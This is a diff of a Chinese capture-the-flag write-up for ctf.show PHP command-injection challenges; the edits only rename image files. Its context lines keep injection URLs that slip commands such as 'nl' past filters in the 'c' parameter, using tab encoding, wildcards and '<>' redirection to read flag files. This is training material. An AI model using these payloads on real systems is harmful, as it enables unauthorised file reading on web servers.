@@ -857,7 +857,7 @@ if(isset($_GET['c'])){
 http://9cecebfd-51c1-4c91-9150-bffa8238d816.challenge.ctf.show/?c=more%09fla?.php||
 ```
 
-<figure><img src="../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -888,13 +888,13 @@ if(isset($_GET['c'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```php
 http://26a6634b-a22b-4009-8819-254d74b86058.challenge.ctf.show/?c=nl%09fla?.php||
 ```
 
-<figure><img src="../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -925,13 +925,13 @@ if(isset($_GET['c'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```php
 http://68c081bd-8321-4230-8e52-2daffaae81f8.challenge.ctf.show/?c=nl%09fla?.php||
 ```
 
-<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -961,7 +961,7 @@ if(isset($_GET['c'])){
     highlight_file(__FILE__); 
 ```
 
-<figure><img src="../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="danger" %}
 <mark style="color:red;">**在做这一题的时候出现了一个很重要的事情，就是<>/\</>和？一起使用时，不回显，所以我们将？换成/，让<>和/一起使用才能回显**</mark>
@@ -971,7 +971,7 @@ if(isset($_GET['c'])){
 http://f9d6e425-e707-4e7e-a144-5bb5ed0f2630.challenge.ctf.show/?c=nl<>fla\g.php||
 ```
 
-<figure><img src="../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -1002,7 +1002,7 @@ if(isset($_GET['c'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (21) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```php
 http://b631725c-44f2-4cb6-a9e6-fc6d6fdf361a.challenge.ctf.show/?c=nl<>fla\g.php||
